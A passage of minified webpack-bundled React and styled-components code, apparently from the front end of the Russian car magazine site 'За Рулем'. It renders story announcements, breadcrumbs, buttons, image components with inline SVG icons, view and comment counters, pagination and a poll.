0;background-size:cover;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);}"], m.Z))),
          y = (0, M.ZP)(g.Z).withConfig({
            displayName: "styled__AnnouncementTitle",
            componentId: "sc-1tvfxig-1"
          })(["font-size:1.625rem;font-weight:700;line-height:1.1;", " @media (max-width:1024px){font-size:1.5rem;line-height:1.625rem;padding-bottom:0px;font-weight:700;word-wrap:break-word;", "}"], (0, d.fq)("$isShort", (0, M.iv)(["font-size:1.2rem;line-height:1.1;"])), (0, d.fq)("$isShort", (0, M.iv)(["font-size:1.5rem;line-height:1.625rem;"]))),
          I = M.ZP.div.withConfig({
            displayName: "styled__AnnouncementDescription",
            componentId: "sc-1tvfxig-2"
          })(["margin-top:0.625rem;line-height:1.2;font-size:1.0625rem;", " ", ""], (0, d.fq)("$isShort", (0, M.iv)(["margin-top:0.75rem;font-size:1.0625rem;"])), (0, d.fq)("$hideDescriptionDesk", (0, M.iv)(["display:none;"]))),
          N = (0, M.ZP)(u.Z).withConfig({
            displayName: "styled__AnnouncementCounters",
            componentId: "sc-1tvfxig-3"
          })(["margin:0.5rem 0 1rem;font-size:0.875rem;", ""], (0, d.fq)("$isInline", (0, M.iv)(["margin-top:0.5rem;margin-left:0.125rem;"]))),
          j = M.ZP.div.withConfig({
            displayName: "styled__SpecialLink",
            componentId: "sc-1tvfxig-4"
          })(['position:relative;margin-left:10px;&:before{content:"";position:absolute;top:50%;left:-10px;width:4px;height:4px;border-radius:50%;background-color:#6b9853;transform:translate(-50%,-50%);}']),
          h = M.ZP.div.withConfig({
            displayName: "styled__PartnerCounters",
            componentId: "sc-1tvfxig-5"
          })(["margin-bottom:0;margin:0.4375rem 0 1em;font-size:0.875rem;display:flex;align-items:center;font-weight:700;color:#7f7f7f;& > *img{margin-right:0.25rem;}& > *{display:flex;align-items:center;}& >:last-child img{margin-bottom:-0.125rem;}img{width:1.25rem;margin-right:0.25rem;}", ""], (0, d.fq)("$isInline", (0, M.iv)(["margin-top:0.5rem;margin-left:0.125rem;"]))),
          x = M.ZP.div.withConfig({
            displayName: "styled__Announcement",
            componentId: "sc-1tvfxig-6"
          })(["display:block;margin-top:2rem;max-width:682px;", " ", " @media (max-width:1024px){margin-top:1rem;", " ", "{font-size:1rem;line-height:1.2rem;padding-top:0rem;letter-spacing:0rem;font-style:normal;font-weight:400;color:#000000;}", " ", "}"], (0, d.fq)("$isShadow", (0, M.iv)(['&:after{content:"";height:0.1625rem;display:block;background:linear-gradient(180deg,transparent 0,rgba(0,0,0,0.2) 100%);}'])), (0, d.fq)("$isInline", (0, M.iv)(["position:relative;display:flex;align-items:flex-start;padding-bottom:0.9375rem;margin:1.2rem 0 !important;&:after{position:absolute;bottom:0;left:0;right:0;height:0.1625rem;}"])), (0, d.fq)("$isShadow", (0, M.iv)(['&:after{content:"";height:2px;display:block;background:#f2f2f2;}'])), I, (0, d.fq)("$hideDescriptionMob", (0, M.iv)(["padding-bottom:12px;", "{display:none;}", "{font-size:1.0625rem;line-height:1.2rem;}"], I, y)), (0, d.fq)("$isInline", (0, M.iv)(["display:flex;align-items:center;margin:0 !important;padding:8px 0;", "{display:none;}", "{width:117px;display:block;margin:0 12px 0 0;img{height:73px;width:117px;margin:0;}}", "{display:inline-block;font-size:16px;line-height:17.6px;font-weight:700;}", "{margin:0.125rem 0 0.25rem 0;}"], I, p, y, N))),
          D = i(2996),
          f = i(2700),
          w = ["story", "isShadow", "isShort", "isInline", "hideDescription", "mediaGallery", "hideCounters", "small"];
        function z(e) {
          var t = e.story,
            i = e.isShadow,
            n = e.isShort,
            a = e.isInline,
            l = e.hideDescription,
            M = void 0 === l ? [!1, !1] : l,
            d = e.mediaGallery,
            u = void 0 === d ? [!1, !1] : d,
            m = e.hideCounters,
            z = e.small,
            T = c()(e, w);
          if (!t) return null;
          var L = t.href,
            E = t.picture,
            A = t.name,
            b = t.announcementXml,
            v = t.visitCounter,
            O = t.commentCounter,
            k = t.advertisment,
            C = t.partnerStory,
            S = t.specialProject,
            Z = "НА ПРАВАХ РЕКЛАМЫ",
            Q = "ПАРТНЕРСКИЙ МАТЕРИАЛ",
            P = o()(M, 2),
            U = P[0],
            Y = P[1],
            _ = o()(u, 2),
            W = _[0],
            G = _[1];
          return s.createElement(x, r()({
            $isShadow: i,
            $isInline: a,
            $hideDescriptionMob: Y
          }, T), s.createElement(p, {
            href: L,
            $isInline: a,
            $imageGallery: W,
            $videoGallery: G,
            $isShort: n
          }, E && s.createElement(f.Z, {
            picture: E,
            small: z
          })), s.createElement("div", null, s.createElement(y, {
            href: L,
            $isShort: n,
            $isInline: a,
            color: "#000"
          }, A), S && s.createElement(j, null, s.createElement(g.Z, {
            href: S.href,
            color: "#000"
          }, S.name)), s.createElement(I, {
            $isShort: n,
            $hideDescriptionDesk: U
          }, b), (k || C) && s.createElement(s.Fragment, null, s.createElement(h, {
            $isInline: a
          }, s.createElement("span", null, s.createElement(D.Z, {
            url: "data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDI0LjEuMywgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPgo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkxheWVyXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4IgoJIHZpZXdCb3g9IjAgMCA5IDkiIHN0eWxlPSJlbmFibGUtYmFja2dyb3VuZDpuZXcgMCAwIDkgOTsiIHhtbDpzcGFjZT0icHJlc2VydmUiPgo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgoJLnN0MHtmaWxsLXJ1bGU6ZXZlbm9kZDtjbGlwLXJ1bGU6ZXZlbm9kZDtmaWxsOiM3RjdGN0Y7fQo8L3N0eWxlPgo8cGF0aCBjbGFzcz0ic3QwIiBkPSJNMS40LDguOEwwLDQuM0MwLDQuMSwwLjEsMy45LDAuMywzLjhsMi4zLTAuN2MwLjEsMCwwLjIsMCwwLjMsMEMyLjksMy4yLDMsMy4zLDMsMy40YzAuNS0wLjQsMS0xLDEuMi0xLjQKCWMwLjItMC41LDAuMS0xLjIsMC4xLTEuMmMwLTAuMiwwLTAuMywwLjItMC41QzQuNywwLDUuMiwwLDUuMywwYzAuMiwwLDAuNCwwLjEsMC42LDAuM2MwLjMsMC4zLDAuNSwwLjksMC40LDEuN2MwLDAuMSwwLDAuMiwwLDAuMwoJYzAsMC4xLDAsMC4xLDAsMC4yYzAsMC4xLDAsMC4xLDAsMC4yYzAuMiwwLjEsMC43LDAuMSwxLjUsMC4xaDAuMkM4LjUsMi44LDksMy4zLDksNGMwLDAuMy0wLjEsMC41LTAuMywwLjdjMCwwLjEsMCwwLjIsMCwwLjMKCWMwLDAuMy0wLjEsMC41LTAuNCwwLjdjMCwwLDAsMCwwLDBjMCwwLjQtMC4yLDAuNy0wLjYsMC45YzAsMCwwLDAsMCwwLjFDNy43LDcuMSw3LjMsNy4zLDYuOCw3LjNjLTAuMSwwLTAuMiwwLTAuMywwCgljLTAuMiwwLTAuNi0wLjEtMS0wLjFsLTAuNiwwYy0wLjMsMC0wLjYsMC0wLjcsMGwwLjIsMC44YzAsMC4xLDAsMC4yLDAsMC4zYzAsMC4xLTAuMSwwLjItMC4yLDAuMkwxLjgsOWMwLDAtMC4xLDAtMC4xLDAKCUMxLjYsOSwxLjQsOC45LDEuNCw4LjhMMS40LDguOHogTTIsOC4ybDEuNi0wLjRMMy4zLDdjMCwwLDAtMC4xLTAuMS0wLjFMMi40LDQuMWMwLDAsMC0wLjEsMC0wLjF2MGwwLDBMMC45LDQuNHYwTDIsOC4yTDIsOC4yegoJIE03LjIsNi40YzAsMCwwLTAuMSwwLTAuMWMwLTAuMSwwLjEtMC4zLDAuMy0wLjNjMC4xLTAuMSwwLjItMC4yLDAuMy0wLjNjMCwwLDAtMC4xLDAtMC4xYzAtMC4yLDAuMS0wLjMsMC4yLTAuNEM4LDUuMiw4LDUuMSw4LDQuOQoJYzAtMC4xLDAtMC4xLDAtMC4yQzcuOSw0LjYsOCw0LjUsOC4xLDQuNEM4LjIsNC4zLDguMyw0LjEsOC4zLDRjMC0wLjMtMC4yLTAuNS0wLjUtMC41YzAsMC0wLjEsMC0wLjIsMGMtMS43LDAtMi0wLjMtMi4xLTAuNAoJQzUuNCwzLDUuNCwyLjksNS40LDIuN2MwLTAuMSwwLTAuMywwLTAuNGMwLTAuMSwwLTAuMSwwLTAuMmMwLTAuMSwwLTAuMiwwLTAuMmMwLjEtMC43LTAuMS0xLTAuMi0xLjFjLTAuMSwwLTAuMSwwLTAuMiwwCgljMCwwLjMsMCwwLjktMC4xLDEuNGMwLDAsMCwwLDAsMC4xQzQuNiwyLjgsMy44LDMuNywzLjMsNC4ybDAuNywyLjJsMCwwYzAuMSwwLDAuMywwLDAuNCwwYzAuMiwwLDAuNCwwLDAuNiwwbDAuNiwwLjEKCWMwLjQsMCwwLjgsMC4xLDEsMC4xYzAuMSwwLDAuMSwwLDAuMiwwQzcsNi41LDcuMSw2LjQsNy4yLDYuNEw3LjIsNi40eiIvPgo8L3N2Zz4K",
            noFormatUrl: !0,
            height: 20,
            width: 20,
            altText: k ? Z : Q
          }), k ? Z : Q))), !k && !C && !m && s.createElement(s.Fragment, null, s.createElement(N, {
            $isInline: a,
            visits: v,
            comments: O
          }))));
        }
      },
      9801: (e, t, i) => {
        i.d(t, {
          Z: () => M
        });
        var n = i(7294),
          r = i(9163),
          a = i(3374),
          o = i(2921),
          l = r.ZP.ol.withConfig({
            displayName: "styled__BreadcrumbsList",
            componentId: "sc-j92sxx-0"
          })(['position:relative;list-style:none;margin:0 0 30px 12px;&:before{content:"";display:block;background:url(', ") 0 0 no-repeat;position:absolute;top:-10px;left:-20px;width:50px;height:54px;}@media (max-width:1024px){margin:0;padding:0;&:before{display:none;}}"], a.Z),
          c = r.ZP.li.withConfig({
            displayName: "styled__BreadcrumbsItem",
            componentId: "sc-j92sxx-1"
          })(['display:inline-block;margin:0 10px 0 0;padding:0;&:after{content:">";display:inline-block;vertical-align:middle;padding-left:10px;color:#c5c5c5;}&:last-child:after{content:"";}@media (max-width:1024px){margin:0;padding:0;}']),
          s = (0, r.ZP)(o.Z).withConfig({
            displayName: "styled__BreadcrumbsLink",
            componentId: "sc-j92sxx-2"
          })(["padding:4px;span{line-height:27px;font-size:14px;@media (max-width:1024px){border-bottom:1px solid #000;}}"]);
        function M(e) {
          var t = e.docsReference || {},
            i = t.webname,
            r = t.name,
            a = t.previousLevelForStory;
          return n.createElement(l, null, n.createElement(c, null, n.createElement(s, {
            href: "/docs",
            color: "#000"
          }, n.createElement("span", null, "Документы"))), a && n.createElement(c, null, n.createElement(s, {
            href: "/docs/-/".concat(a.webname),
            color: "#000"
          }, n.createElement("span", null, a.name))), i && n.createElement(c, null, n.createElement(s, {
            href: a ? "/docs/-/".concat(a.webname, "-/").concat(i) : "/docs/-/".concat(i),
            color: "#000"
          }, n.createElement("span", null, r))));
        }
      },
      5129: (e, t, i) => {
        i.d(t, {
          Z: () => m
        });
        var n = i(7154),
          r = i.n(n),
          a = i(6479),
          o = i.n(a),
          l = i(7294),
          c = i(9163),
          s = i(8655),
          M = c.ZP.div.withConfig({
            displayName: "styled__Gradient",
            componentId: "sc-v3bv6d-0"
          })(["padding:1px;box-shadow:0 3px 1px rgb(0 0 0 / 13%);border-radius:16px;background:#bcbcbc;background:linear-gradient(to bottom,#ddd 0,#9c9b9b 100%);", "", ""], (0, s.fq)("$redText", (0, c.iv)(["box-shadow:none;background:transparent;padding:0;border-radius:0;"])), (0, s.fq)("$smallBlack", (0, c.iv)(["box-shadow:none;background:transparent;padding:0;border-radius:0;"]))),
          d = c.ZP.div.withConfig({
            displayName: "styled__ButtonText",
            componentId: "sc-v3bv6d-1"
          })(["position:relative;display:block;border-radius:16px;box-shadow:inset 0 -5px 5px rgb(175 187 197 / 24%);background:linear-gradient(to bottom,#fff 0,#e6eaed 47%,#cfd4d8 78%,#fff 100%);padding:0 10px;", " ", ""], (0, s.fq)("$redText", (0, c.iv)(["font-weight:700;font-size:1.25rem;line-height:normal;background:transparent;border-radius:0;color:#970000;box-shadow:none;"])), (0, s.fq)("$smallBlack", (0, c.iv)(["font-weight:400;font-size:12px;line-height:normal;background:transparent;border-radius:0;color:#000000;box-shadow:none;"]))),
          g = c.ZP.button.withConfig({
            displayName: "styled__Button",
            componentId: "sc-v3bv6d-2"
          })(["margin:0 0 -3px 0;padding:0 0 3px 0;display:inline-block;outline:0 !important;cursor:pointer;font-size:14px;border:none;line-height:31px;min-width:110px;background:0 0;", " ", " ", " &:hover ", "{box-shadow:0 3px 1px rgb(101 0 0 / 19%);background:linear-gradient(to bottom,#ff652f 0,#df2e4b 47%,#b9021c 78%,#f32626 100%);", " ", "}&:hover ", "{box-shadow:inset 0 -5px 5px rgb(175 187 197 / 24%);background:linear-gradient(to bottom,#ff652f 0,#df2e4b 47%,#b9021c 78%,#f32626 100%);", " ", "}&:hover:disabled ", "{box-shadow:0 3px 1px rgb(0 0 0 / 13%);border-radius:16px;background:#bcbcbc;background:linear-gradient(to bottom,#ddd 0,#9c9b9b 100%);}&:hover:disabled ", "{box-shadow:inset 0 -5px 5px rgb(175 187 197 / 24%);background:linear-gradient(to bottom,#fff 0,#e6eaed 47%,#cfd4d8 78%,#fff 100%);}&:disabled{cursor:default;}"], (0, s.fq)("$redText", (0, c.iv)(["appearance:none;display:inline-block;border:none;margin:0.9375rem 0 0 0;text-align:center;padding:0;border-radius:0;line-height:normal;"])), (0, s.fq)("$smallBlack", (0, c.iv)(['appearance:none;display:inline-block;border:none;margin:0.9375rem 0 0 0;text-align:center;padding:0;border-radius:0;line-height:normal;position:relative;&:before{position:absolute;bottom:0;left:15px;content:"↓";font-size:15px;margin-right:10px;}'])), (0, s.fq)("$arrowUp", (0, c.iv)(['&:before{content:"↑";}'])), M, (0, s.fq)("$redText", (0, c.iv)(["background:transparent;box-shadow:none;"])), (0, s.fq)("$smallBlack", (0, c.iv)(["background:transparent;box-shadow:none;"])), d, (0, s.fq)("$redText", (0, c.iv)(["background:transparent;box-shadow:none;opacity:0.8;"])), (0, s.fq)("$smallBlack", (0, c.iv)(["background:transparent;box-shadow:none;opacity:0.8;text-decoration:underline;"])), M, d),
          u = ["redText", "smallBlack", "arrowUp"];
        const m = l.forwardRef(function (e, t) {
          var i = e.redText,
            n = void 0 !== i && i,
            a = e.smallBlack,
            c = void 0 !== a && a,
            s = e.arrowUp,
            m = void 0 !== s && s,
            p = o()(e, u);
          return l.createElement(g, r()({
            ref: t,
            $redText: n,
            $smallBlack: c,
            $arrowUp: m
          }, p), l.createElement(M, {
            $redText: n,
            $smallBlack: c
          }, l.createElement(d, {
            $redText: n,
            $smallBlack: c
          }, p.children)));
        });
      },
      1416: (e, t, i) => {
        i.d(t, {
          Z: () => l
        });
        var n = i(6479),
          r = i.n(n),
          a = i(7294),
          o = ["date", "dateNumber"];
        function l(e) {
          var t = e.date,
            i = e.dateNumber,
            n = r()(e, o),
            l = t.day,
            c = t.month,
            s = t.monthName,
            M = t.year;
          return i ? a.createElement("time", n, l && l < 10 ? a.createElement("span", null, "0", l, ".") : a.createElement("span", null, l, "."), c && c < 10 ? a.createElement("span", null, "0", c, ".") : a.createElement("span", null, c, "."), a.createElement("span", null, M)) : a.createElement("time", n, a.createElement("span", null, l), " ", a.createElement("span", null, s));
        }
      },
      2996: (e, t, i) => {
        i.d(t, {
          Z: () => u
        });
        var n = i(7154),
          r = i.n(n),
          a = i(6479),
          o = i.n(a),
          l = i(7294),
          c = i(9163),
          s = c.ZP.div.withConfig({
            displayName: "styled__ImagePlaceholder",
            componentId: "sc-168m61c-0"
          })(["height:", "px;border-radius:", "px;"], function (e) {
            return e.$height ? e.$height : "0";
          }, function (e) {
            return e.$borderRadius ? e.$borderRadius : "0";
          }),
          M = c.ZP.img.withConfig({
            displayName: "styled__Image",
            componentId: "sc-168m61c-1"
          })(["border-radius:", "px;object-fit:", ";"], function (e) {
            return e.$borderRadius ? e.$borderRadius : "0";
          }, function (e) {
            return e.$objectFit ? e.$objectFit : "none";
          }),
          d = i(4343),
          g = ["picture", "url", "height", "size", "width", "noFormatUrl", "altText", "onClick", "borderRadius", "objectFit"];
        function u(e) {
          var t = e.picture,
            i = e.url,
            n = e.height,
            a = e.size,
            c = e.width,
            u = e.noFormatUrl,
            m = e.altText,
            p = e.onClick,
            y = e.borderRadius,
            I = e.objectFit,
            N = void 0 === I ? "contain" : I,
            j = o()(e, g),
            h = t || {},
            x = h.href,
            D = h.servingUrl,
            f = h.title,
            w = D || x,
            z = t ? "".concat(d.G3).concat(w) : i,
            T = f || m || "За Рулем";
          return a ? l.createElement(M, r()({}, j, {
            src: "".concat(z, "=s").concat(a, "-c"),
            height: a,
            width: a,
            alt: T,
            $borderRadius: y,
            $objectFit: N,
            loading: "lazy"
          })) : c && !u ? l.createElement(M, r()({}, j, {
            src: "".concat(z, "=h").concat(c),
            height: c,
            width: c,
            alt: T,
            $borderRadius: y,
            $objectFit: N,
            loading: "lazy"
          })) : n && !u ? l.createElement(M, r()({}, j, {
            src: "".concat(z, "=h").concat(n),
            height: "auto",
            width: "100%",
            alt: T,
            $borderRadius: y,
            $objectFit: N,
            loading: "lazy"
          })) : u ? l.createElement(M, r()({}, j, {
            src: "".concat(z),
            height: n || "auto",
            width: c || "100%",
            alt: T,
            $borderRadius: y,
            $objectFit: N,
            onClick: p,
            loading: "lazy"
          })) : l.createElement(s, null, l.createElement(M, r()({}, j, {
            src: z,
            height: "auto",
            width: "100%",
            alt: T,
            $borderRadius: y,
            $objectFit: N,
            loading: "lazy"
          })));
        }
      },
      6233: (e, t, i) => {
        i.d(t, {
          Z: () => a
        });
        var n = i(7294),
          r = i(405);
        function a(e) {
          var t = e.src;
          return n.createElement(r.q, null, n.createElement("link", {
            rel: "preload",
            href: t,
            as: "image"
          }));
        }
      },
      3493: (e, t, i) => {
        i.d(t, {
          Z: () => u
        });
        var n = i(7154),
          r = i.n(n),
          a = i(6479),
          o = i.n(a),
          l = i(7294),
          c = i(9163),
          s = i(8655),
          M = c.ZP.div.withConfig({
            displayName: "styled__ItemCounters",
            componentId: "sc-fsxzfd-0"
          })(["display:flex;align-items:center;font-weight:700;color:#7f7f7f;font-size:0.875rem;margin-top:0.3rem;& > *{display:flex;align-items:center;color:#7f7f7f;}& >:not(:last-child){margin-right:1rem;}@media (max-width:1024px){font-size:0.875rem;margin-top:0.125rem;margin-bottom:0.25rem;", "}"], (0, s.fq)("$isPopular", (0, c.iv)(["font-size:0.875rem;line-height:1.0625rem;padding:5px 0;"]))),
          d = i(2996),
          g = ["visits", "comments", "isPopular", "commentsWidth", "commentsHeight"];
        function u(e) {
          var t = e.visits,
            i = void 0 === t ? 0 : t,
            n = e.comments,
            a = void 0 === n ? 0 : n,
            c = e.isPopular,
            s = e.commentsWidth,
            u = void 0 === s ? 20 : s,
            m = e.commentsHeight,
            p = void 0 === m ? 18 : m,
            y = o()(e, g);
          return a || i ? l.createElement(M, r()({}, y, {
            $isPopular: c
          }), i > 0 && l.createElement("span", null, l.createElement(d.Z, {
            noFormatUrl: !0,
            url: "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAiIGhlaWdodD0iMTQiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZD0iTTEwIDBDNS44IDAgMiAyLjkgMCA3YzEuOCA0LjEgNS43IDcgMTAgNyA0LjQgMCA4LjItMi45IDEwLTctMS44LTQuMS01LjctNy0xMC03WiIgZmlsbD0iZ3JheSIvPjxwYXRoIGQ9Ik0xOCA3Yy0xLjcgMy01IDUtOCA1LTMuMSAwLTYuMy0yLTgtNSAuOC0xLjQgMi44LTMuMiA0LTQgMCAwLTEgMS0xIDMgMCAzIDIgNSA1IDVzNS0yIDUtNWMwLTItMS0zLTEtMyAxLjUgMSAzIDIuMyA0IDRaIiBmaWxsPSIjRjFGMUYxIi8+PHBhdGggZD0iTTEwIDRjMCAxLTEgMi0yIDJTNiA1IDYgNHMxLTIgMi0yIDIgMSAyIDJaIiBmaWxsPSIjRjFGMUYxIi8+PC9zdmc+",
            width: 20,
            height: 14,
            altText: "Количество просмотров"
          }), " ", i), a > 0 && l.createElement("span", null, l.createElement(d.Z, {
            noFormatUrl: !0,
            url: "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAiIGhlaWdodD0iMTciIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZD0iTTUgMTdjLTEgMC0xLTEtMS0xdi0ySDJhMiAyIDAgMCAxLTEuNC0uNkEyIDIgMCAwIDEgMCAxMlYyYzAtMSAxLTIgMi0yaDE2YzEgMCAyIDEgMiAydjEwYzAgMS0xIDItMiAySDlsLTQgM1oiIGZpbGw9ImdyYXkiLz48cGF0aCBkPSJNMiAydjEwaDJjMSAwIDEgMCAxIDF2MWwzLTJoMTBWMkgyWiIgZmlsbD0iI0YxRjFGMSIvPjxwYXRoIGQ9Ik00IDZWNWgxMnYxSDRabTAgM1Y4aDEydjFINFoiIGZpbGw9ImdyYXkiLz48L3N2Zz4=",
            width: u,
            height: p,
            altText: "Количество комментариев"
          }), " ", a)) : null;
        }
      },
      3225: (e, t, i) => {
        i.d(t, {
          Z: () => p
        });
        var n = i(7294),
          r = i(9163),
          a = i(8655),
          o = i(2921),
          l = r.ZP.div.withConfig({
            displayName: "styled__PaginationBar",
            componentId: "sc-1sfdd6e-0"
          })(["display:flex;align-items:center;margin:1.5625rem 0 1.25rem;overflow:hidden;@media (max-width:1024px){flex-flow:column;}"]),
          c = r.ZP.div.withConfig({
            displayName: "styled__PagesTitle",
            componentId: "sc-1sfdd6e-1"
          })(["flex-shrink:0;font-size:1.25rem;margin-right:10px;"]),
          s = r.ZP.div.withConfig({
            displayName: "styled__PaginationWrap",
            componentId: "sc-1sfdd6e-2"
          })(["padding:0;margin:0;display:flex;align-items:center;flex-flow:row wrap;@media (max-width:1024px){flex-flow:row wrap;margin-bottom:0.375rem;}"]),
          M = (0, r.ZP)(o.Z).withConfig({
            displayName: "styled__PaginationArrow",
            componentId: "sc-1sfdd6e-3"
          })(["display:block;margin:0 0.375rem;"]),
          d = (0, r.ZP)(o.Z).withConfig({
            displayName: "styled__PaginationArrowRight",
            componentId: "sc-1sfdd6e-4"
          })(["display:block;margin:0 0.375rem;img{transform:rotate(180deg);}"]),
          g = (0, r.ZP)(o.Z).withConfig({
            displayName: "styled__PaginationItem",
            componentId: "sc-1sfdd6e-5"
          })(["border:0.125rem solid transparent;border-radius:50%;width:2.5rem;height:2.5rem;margin:0 0.0625rem;flex-shrink:0;display:flex;align-items:center;justify-content:center;transition:0.3s;font-size:1.625rem;font-weight:700;&:hover{border-color:#ddd;}", " ", ""], (0, a.fq)("$isSelected", (0, r.iv)(["border-color:#970000;"])), (0, a.fq)("$noBorder", (0, r.iv)(["border:none;;"]))),
          u = i(7941),
          m = i(2996);
        function p(e) {
          var t = e.pages,
            i = e.selected,
            r = e.nextHref,
            a = e.prevHref,
            o = e.isStory,
            p = function () {
              window.scrollTo(0, 0);
            };
          return n.createElement(l, null, n.createElement(c, null, "Страницы"), n.createElement(s, null, a && n.createElement(M, {
            href: a
          }, n.createElement(m.Z, {
            noFormatUrl: !0,
            url: u.Z,
            width: 24,
            height: 24,
            altText: "Предыдущая страница"
          })), t.map(function (e) {
            var t = e.id,
              r = e.text,
              a = e.href,
              l = o ? i === t : "selected" === e.selected,
              c = "..." === r;
            return n.createElement(g, {
              key: t,
              $isSelected: l,
              href: a,
              $noBorder: c,
              color: "#000",
              onClick: p
            }, t || r);
          }), r && n.createElement(d, {
            href: r
          }, n.createElement(m.Z, {
            noFormatUrl: !0,
            url: u.Z,
            width: 24,
            height: 24,
            altText: "Следующая страница"
          }))));
        }
      },
      9145: (e, t, i) => {
        i.d(t, {
          Z: () => R
        });
        var n = i(3038),
          r = i.n(n),
          a = i(7294),
          o = i(4751),
          l = i(9163),
          c = i(8655),
          s = i(1416),
          M = i(2921),
          d = (0, l.ZP)(s.Z).withConfig({
            displayName: "styled__PollDate",
            componentId: "sc-1k7gltg-0"
          })(["display:block;margin-bottom:0.25rem;"]),
          g = (0, l.ZP)(M.Z).withConfig({
            displayName: "styled__PollTitle",
            componentId: "sc-1k7gltg-1"
          })(["display:block;margin-top:0;font-size:1.25rem;font-weight:700;margin-bottom:0.625rem;padding-left:0;&:hover{border-color:transparent;}"]),
          u = l.ZP.form.withConfig({
            displayName: "styled__PollItems",
            componentId: "sc-1k7gltg-2"
          })(["width:100%;"]),
          m = l.ZP.div.withConfig({
            displayName: "styled__PollAnswers",
            componentId: "sc-1k7gltg-3"
          })(["padding-top:0.5rem;"]),
          p = l.ZP.label.withConfig({
            displayName: "styled__PollAnswer",
            componentId: "sc-1k7gltg-4"
          })(["display:flex;align-items:center;cursor:pointer;&:not(:last-child){margin-bottom:0.75rem;}"]),
          y = l.ZP.input.withConfig({
            displayName: "styled__PollAnswerInput",
            componentId: "sc-1k7gltg-5"
          })(["display:none;&:checked + span::after{background:#5b5b5b;}"]),
          I = l.ZP.span.withConfig({
            displayName: "styled__PollAnswerName",
            componentId: "sc-1k7gltg-6"
          })(['position:relative;display:flex;align-items:flex-start;&:before{content:"";border:0.0625rem solid #5b5b5b;border-radius:50%;width:20px;height:20px;margin-right:0.875rem;flex-shrink:0;}&:after{content:"";border:0.0625rem solid #5b5b5b;border-radius:50%;width:14px;height:14px;position:absolute;top:0.1875rem;left:0.1875rem;}']),
          N = l.ZP.div.withConfig({
            displayName: "styled__PollButtonContainer",
            componentId: "sc-1k7gltg-7"
          })(["margin-top:1.375rem;text-align:right;"]),
          j = l.ZP.div.withConfig({
            displayName: "styled__PollResult",
            componentId: "sc-1k7gltg-8"
          })(["display:flex;flex-flow:column;"]),
          h = l.ZP.div.withConfig({
            displayName: "styled__PollItemName",
            componentId: "sc-1k7gltg-9"
          })(["color:#000;font-weight:400;text-align:left;"]),
          x = l.ZP.div.withConfig({
            displayName: "styled__PollItemBar",
            componentId: "sc-1k7gltg-10"
          })(["display:flex;flex-flow:row;justify-content:space-between;align-items:center;line-height:10px;padding-bottom:13px;"]),
          D = l.ZP.div.withConfig({
            displayName: "styled__PollItemScale",
            componentId: "sc-1k7gltg-11"
          })(["position:relative;width:100%;height:10px;background-color:#fff;border-radius:2px;"]),
          f = l.ZP.div.withConfig({
            displayName: "styled__PollItemValue",
            componentId: "sc-1k7gltg-12"
          })(["width:", ";height:10px;position:absolute;background-color:#e40025;z-index:1;border-radius:2px;"], function (e) {
            return e.$width ? "".concat(e.$width, "%") : "auto";
          }),
          w = l.ZP.div.withConfig({
            displayName: "styled__PolItemNumber",
            componentId: "sc-1k7gltg-13"
          })(["text-align:right;font-weight:700;width:8.125rem;padding-left:0.3125rem;padding-right:0.0625rem;"]),
          z = l.ZP.span.withConfig({
            displayName: "styled__PollItemPercent",
            componentId: "sc-1k7gltg-14"
          })(["font-weight:400;font-style:italic;"]),
          T = l.ZP.div.withConfig({
            displayName: "styled__PollWrap",
            componentId: "sc-1k7gltg-15"
          })(["display:flex;align-items:center;justify-content:space-between;margin-top:1.5rem;margin-left:-0.125rem;&:last-child{margin-top:1.1875rem;}"]),
          L = l.ZP.div.withConfig({
            displayName: "styled__PollTotal",
            componentId: "sc-1k7gltg-16"
          })(["margin-top:-0.4375rem;"]),
          E = (0, l.ZP)(M.Z).withConfig({
            displayName: "styled__PollAll",
            componentId: "sc-1k7gltg-17"
          })(["align-self:start;"]),
          A = l.ZP.div.withConfig({
            displayName: "styled__PollShare",
            componentId: "sc-1k7gltg-18"
          })(["display:flex;align-items:center;"]),
          b = l.ZP.span.withConfig({
            displayName: "styled__PollShareTitle",
            componentId: "sc-1k7gltg-19"
          })(["margin-top:-0.375rem;"]),
          v = l.ZP.div.withConfig({
            displayName: "styled__PollSummary",
            componentId: "sc-1k7gltg-20"
          })(["display:block;"]),
          O = l.ZP.div.withConfig({
            displayName: "styled__Poll",
            componentId: "sc-1k7gltg-21"
          })(["background:#f2f2f2;margin-top:1.8125rem;padding:1.75rem 2rem 0.5rem;position:relative;margin-bottom:32px;", " ", " @media (max-width:1024px){margin:1rem 0;padding:12px;margin-bottom:0.5rem;", " ", "{font-style:normal;font-weight:700;font-size:1.3125rem;line-height:1.5rem;margin:3px 0 9px 0;}", "{display:none;}", "{padding-bottom:0.2rem;line-height:1.1em;}", "{display:flex;flex-flow:row;align-items:center;justify-content:space-between;}}"], (0, c.fq)("$isShadow", (0, l.iv)(['&:after{position:absolute;bottom:0;left:0;right:0;content:"";height:0.1625rem;display:block;background:linear-gradient(180deg,transparent 0,rgba(0,0,0,0.2) 100%);}'])), (0, c.fq)("$isLoading", (0, l.iv)(['&:after{position:absolute;bottom:0;left:0;right:0;top:0;content:"";opacity:0.75;}'])), (0, c.fq)("$isShadow", (0, l.iv)(["&:after{display:none;}"])), g, A, h, v),
          k = (l.ZP.div.withConfig({
            displayName: "styled__PromoLinkContainer",
            componentId: "sc-1k7gltg-22"
          })(["text-align:center;padding-top:13px;font-weight:400;"]), i(7513)),
          C = i(7563),
          S = i(5129),
          Z = i(7137),
          Q = i(2876);
        function P(e) {
          var t = e.items,
            i = e.multiple,
